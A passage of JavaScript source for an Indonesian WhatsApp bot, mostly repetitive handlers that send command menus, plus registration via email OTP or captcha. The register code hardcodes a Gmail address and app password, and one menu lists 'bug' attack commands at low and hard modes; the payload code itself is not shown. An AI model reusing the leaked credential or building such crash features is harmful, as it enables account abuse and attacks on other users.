                "buttonParamsJson": "{\"title\":\"MENU\",\"sections\":[{\"title\":\"MENU BOT QIOO OFFICIAL\",\"highlight_label\":\"Qioo Official\",\"rows\":[{\"header\":\"Simple Menu 📦\",\"title\":\"Simple Menu\",\"description\":\"Menampilkan Simple Menu 📦\",\"id\":\".simplemenu\"},{\"header\":\"Owner Menu 👑\",\"title\":\"Owner Menu\",\"description\":\"Menampilkan Owner Menu👑\",\"id\":\".ownermenu\"},{\"header\":\"Group Menu 👥\",\"title\":\"Group Menu\",\"description\":\"Menampilkan Group Menu👥\",\"id\":\".groupmenu\"},{\"header\":\"Panel Menu 🦖\",\"title\":\"Panel Menu\",\"description\":\"Menampilkan Fitur Pterpdactly 🦖\",\"id\":\".panelmenu\"},{\"header\":\"Fun Menu 🎉\",\"title\":\"Menu Gabut\",\"description\":\"Menampilkan Fun Menu🎉\",\"id\":\".funmenu\"},{\"header\":\"Download Menu 📥\",\"title\":\"Download Fitur\",\"description\":\"Menampilkan Download Menu📥\",\"id\":\".downloadmenu\"},{\"header\":\"Convert Menu 🔃\",\"title\":\"Convert Fitur\",\"description\":\"Menampilkan Convert Menu🔃\",\"id\":\".convertmenu\"},{\"header\":\"Game Menu 🎮\",\"title\":\"Fitur Games\",\"description\":\"Menampilkan Game Menu🎮\",\"id\":\".gamemenu\"},{\"header\":\"Balance Menu 💸\",\"title\":\"Your Akun Balance\",\"description\":\"Menampilkan Balance Menu💸\",\"id\":\".balancemenu\"},{\"header\":\"Main Menu 🕹️\",\"title\":\"Sistematis Fitur\",\"description\":\"Menampilkan Main Menu🕹️\",\"id\":\".mainmenu\"},{\"header\":\"Random Sticker 🖼️\",\"title\":\"Stiker Acak\",\"description\":\"Menampilkan Sticker Menu🖼️\",\"id\":\".randomsticker\"},{\"header\":\"Islam Menu ☪️\",\"title\":\"Fitur Islami\",\"description\":\"Menampilkan Islami Menu☪️\",\"id\":\".islammenu\"},{\"header\":\"RPG Menu ⚔️\",\"title\":\"Game Survival Role Play\",\"description\":\"Menampilkan RPG Menu⚔️\",\"id\":\".rpgmenu\"},{\"header\":\"Script Bot🦚\",\"title\":\"Source Code Qioo\",\"description\":\"Menampilkan Script Bot🦚\",\"id\":\".script\"}]}]}"
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"All Menu\",\"id\":\".allmenu\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Speedtest\",\"id\":\".ping\"}`
              },{
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://wa.me/message/GUDWAL3TZRN2I1\",\"merchant_url\":\"https://wa.me/message/GUDWAL3TZRN2I1\"}`
              }
           ]
await sendButtonDocThumbnail(m.chat, "------------ » *BOT INFO* « ------------", simplemenu, pathimg, button)
/*await vreden.sendMessage(m.chat, {
text: simplemenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})*/
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'simplemenu':{
let simplee = `▢━━「 *SIMPLE MENU* 」━━▢

${cmdSim.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: simplee,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mainmenu':{
let mainmenu = `▢━━「 *MAIN* 」━━▢

${cmdMain.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: mainmenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'rpgmenu': {
let rpgmenu = `▢━━「 *RPG GAME* 」━━▢

${cmdRPG.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: rpgmenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'panelmenu':{
let panelmenu = `▢━━「 *PTERODACTLY* 」━━▢

${cmdPanel.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: panelmenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'convertmenu':{
let convertMenu = `▢━━「 *CONVERTER* 」━━▢

${cmdConvert.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: convertMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'anonymousmenu':{
let anonymousMenu = `▢━━「 *ANONYMOUS* 」━━▢

${cmdAnom.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: anonymousMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'storemenu':{
let storeMenu = `▢━━「 *STORE* 」━━▢

${cmdStore.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: storeMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gamemenu':{
let gameMenu = `▢━━「 *FITUR GAME* 」━━▢

${cmdGame.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: gameMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'groupmenu':{
let groupMenu = `▢━━「 *FITUR GRUP* 」━━▢

${cmdGrup.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: groupMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'downloadmenu':{
let downloadMenu = `▢━━「 *DOWNLOADER* 」━━▢

${cmdDown.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: downloadMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'searchmenu':{
let searchMenu = `▢━━「 *SEARCHING* 」━━▢

${cmdSearch.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: searchMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'randommenu':{
let randomMenu = `▢━━「 *RANDOM* 」━━▢

${cmdRdm.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: randomMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'randomquotes':{
let randomQuotes = `▢━━「 *QUOTES* 」━━▢

${cmdQuo.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: randomQuotes,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cewekasiamenu':{
let cewekMenu = `▢━━「 *CEWEK ASIA* 」━━▢

${cmdCwe.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: cewekMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cowokasiamenu':{
let cowokMenu = `▢━━「 *COWO GANTENG* 」━━▢

${cmdCwo.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: cowokMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'balancemenu':{
let balanceMenu = `▢━━「 *BALANCE* 」━━▢

${cmdBal.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: balanceMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ownermenu':{
let ownerMenu = `▢━━「 *OWNER* 」━━▢

${cmdOwn.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: ownerMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'storagemenu':{
let storageMenu = `▢━━「 *STORAGE* 」━━▢

${cmdStorage.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: storageMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'asupanmenu':{
let asupanMenu = `▢━━「 *ASUPAN* 」━━▢

${cmdAsupan.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: asupanMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'randomsticker':{
let randomSticker = `▢━━「 *STICKER* 」━━▢

${cmdStiker.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: randomSticker,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'stalkingmenu':{
let stalkingMenu = `▢━━「 *STALKER* 」━━▢

${cmdStalk.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: stalkingMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'funmenu':{
let funMenu = `▢━━「 *FUN (GABUT)* 」━━▢

${cmdFun.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: funMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'islammenu':{
let islamMenu = `▢━━「 *ISLAMI* 」━━▢

${cmdIslam.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: islamMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bugmenu':{
let bugMenu = `▢━━「 *BUG FITUR* 」━━▢

*LOW MODE*
${cmdBug.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

*HARD MODE*
${cmdBugHard.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: bugMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'nsfwmenu':{
let nsfwMenu = `▢━━「 *NSFW (18+)* 」━━▢

${cmdNsfw.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: nsfwMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ephotomenu': case 'ephoto360menu':{
let ephotoMenu = `▢━━「 *EPHOTO 360* 」━━▢

${cmdEph.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}`
await vreden.sendMessage(m.chat, {
text: ephotoMenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'donasi': case 'donate': {
vreden.sendMessage(m.chat, { image: { url: setting.fotoDonasi }, caption: `*乂 DONASI BOT*\n\nHai Kak, Ingin Donasi?, Silahkan Donasi Ke Owner Bot, Ketik .owner\n\n_Terima Kasih Yang Sudah Donasi, Berapapun Donasi Kamu Akan Sangat Saya Hargain_ >,<`}, {quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'rules': case 'aturan': case 'aturanbot':{
var cpt = `Peraturan Penggunaan Bot :\n- Dilarang Spam\n- Dilarang Menelpon Bot\n- Dilarang Mengirim Virus Ke Bot\n\nCatatan :\nSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
await vreden.sendMessage(m.chat, {
text: cpt,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'register': case 'registrasi': case 'regis': case 'daftar': {
if (db.data.users[m.sender].daftar) return warning(`Anda Telah Terverifikasi!!`)
if (args[0] === "-email") {
if (!args[1]) return warning(`Masukan Email Kamu\n\n*Contoh* :\n${prefix + command} email hartmann123@gmail.com`)
async function sendEmail(OTP, Number, Mail) {
    let html = `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verifikasi Kode</title>
</head>
<body style="font-family: Arial, sans-serif; background-image: url('https://telegra.ph/file/686d6dadc3c08e906c2aa.jpg'); background-size: cover; color: #ffffff; padding: 40px 20px;">

<div style="max-width: 600px; margin: 0 auto; background-color: rgba(0, 0, 0, 0.7); border-radius: 10px; box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.3); padding: 20px;">
    <div style="text-align: center; margin-bottom: 20px;">
        <img src="https://telegra.ph/file/6766094bda9555dc29af3.jpg" alt="Vreden Logo" style="width: 100px; height: 100px; border-radius: 50%; border: 2px solid #ffffff;">
    </div>

    <h2 style="text-align: center;">Verifikasi Kode</h2>
    <p style="text-align: center;">Berikut adalah kode verifikasi Anda:</p>
    <div style="text-align: center;">
        <p style="font-weight: bold; font-size: 30px; margin-top: 10px;">${OTP}</p>
    </div>
    
    <div style="text-align: center; margin-top: 20px;">
        <a href="https://wa.me/${Number}?text=${OTP}" style="background-color: #007bff; color: #ffffff; text-decoration: none; padding: 10px 20px; border-radius: 5px; display: inline-block;">Verifikasi Sekarang</a>
    </div>

    <p style="text-align: center; margin-top: 20px;">Klik tombol di atas untuk memverifikasi login Anda.</p>
                <p style="font-size: 12px; color: #999999; text-align: center;">© 2024 Vreden. All rights reserved.</p>
    </div>
    
</body>
</html>
`
var transporter = nodemailer.createTransport({
	service: 'gmail',
	auth:{
		user:'vreden.verifikasi@gmail.com',
		pass: 'bhzmhaujulcqsnud'
	}
});

      let mailOptions = {
        from: 'Vreden Putra Ltc.',
        to: Mail,
        subject: '[ Qioo ] Kode Verifikasi!',
        html: html,
      };

      transporter.sendMail(mailOptions, (err) => {
        if (err) { console.log(err); }
      });
  }
var angka = await randomNomor(1000, 9999)
db.data.users[m.sender].otp = angka
await sendEmail(angka, botNumber.split("@")[0], args[1])
let perip = `
1. Buka Email Anda
2. Cari Email Dari Qioo
3. Cek Inbox Utama/Spam
4. Klik Tautan Konfirmasi

Jika Email Tidak Terkirim
Chat Owner Untuk Bertanya`
let button = [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\"}`
              }
           ]
let buffer = await getBuffer("https://telegra.ph/file/6934385f19c5d3bb6db92.png")
await sendButtonDocImage(m.chat, '📌 Email Terkirim', perip, buffer, button)
} else if (args[0] === "-captcha") {
var angka = await randomNomor(1000, 9999)
db.data.users[m.sender].otp = angka
try {
const { CaptchaGenerator } = require("captcha-canvas");
const captcha = new CaptchaGenerator()
.setDimension(150, 450) 
.setCaptcha({text: `${angka}`, size: 60, color: "blue"})
.setDecoy({opacity: 0.5})
.setTrace({color: "blue"});
const buffer = captcha.generateSync();
let button = [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Halo👋\"}`
              }
           ]
await sendButtonImage(m.chat, '*CAPTCHA CODE*', `\nMasukan Kode Verifikasi\nDiatas Untuk Memverifikasi\nBahwa Anda Bukan Robot\n\n\n_Chat Owner Jika Kode_\n_Tidak Muncul Atau Error_`, buffer, button)
} catch (e) {
m.reply('*[ ERROR ]* Gunakan Metode Login Lain!')
}
} else {
balas(`*Daftar dengan CAPTCHA:*
.daftar -captcha

*Daftar dengan Email:*
.daftar -email emailmu@gmail.com

`)}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cn': case 'nickname': {
if (!text) return warning(`Masukan Nickname Bot Mu\n\n*Contoh* :\n.cn Budi`)
if (text.length > 11) return warning('Maksimal 11 Karakter!')
const serialUser = `${text}`
db.data.users[m.sender].nama = serialUser
m.reply(`Sukses Ubah Nama Anda`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'infobot': case 'info': case 'botinfo':{
addCountCmd('infobot', m.sender, _cmd)
var capt = `
- *Name :* ${vreden.user.name}
- *Number :* ${botNumber.split("@")[0]}
- *Owner :* ${prefix}owner
- *User :* ${Object.values(global.db.data.users).length} users
- *Prefix :* ${prefix}
- *Total :* ${totalFitur()} Fitur
- *Error :* 4 Fitur


------------ » *FITUR BOT* « ------------

- *Anti Hapus :* ${setting.antiDelete ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti Call :* ${setting.anticall ? 'Aktif 🟢' : 'Mati 🔴'}
- *Anti View One :* ${setting.antiViewOnce ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Bio :* ${setting.autobio ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Blok 212 :* ${setting.autoblok212 ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Respond :* ${setting.autorespond ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Read :* ${setting.autoread ? 'Aktif 🟢' : 'Mati 🔴'}
- *Auto Backup :* ${setting.autobackup ? 'Aktif 🟢' : 'Mati 🔴'}
- *PC only :* ${setting.pconly ? 'Aktif 🟢' : 'Mati 🔴'}
- *GC only :* ${setting.gruponly ? 'Aktif 🟢' : 'Mati 🔴'}
`
let button = [
              {
                "name": "single_select",
